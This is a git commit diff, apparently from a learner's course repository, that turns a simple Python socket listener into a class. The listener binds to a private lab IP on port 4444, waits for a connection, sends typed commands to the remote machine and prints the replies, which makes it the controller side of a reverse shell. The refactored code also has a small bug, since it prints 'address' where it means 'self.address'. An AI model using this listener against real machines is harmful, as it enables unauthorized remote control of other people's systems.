f2392dedbb945c74e20b276b22dd7baa955bc8d5
https://github.com/micosanguyen <micosa114@gmail.com>
2025-04-02 18:14:02 +0700

    class_listener_helloworld_converted

--- listener_helloworld.py
+++ listener_helloworld.py
@@ -2,17 +2,27 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #basicaly allow to re-use socket
-listener.bind(("192.168.204.128", 1234))
-listener.listen(0)
-print("[+] Waiting for incoming connection")
-connection, address = listener.accept()
-print("[+] Got a connection from " + str(address))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # basicaly allow to re-use socket
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection")
+        self.connection, self.address = listener.accept()
+        print("[+] Got a connection from " + str(address))
 
-while True:
-    command = input(">> ")
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+my_listener = Listener("192.168.204.128", 4444)
+my_listener.run()
+
 
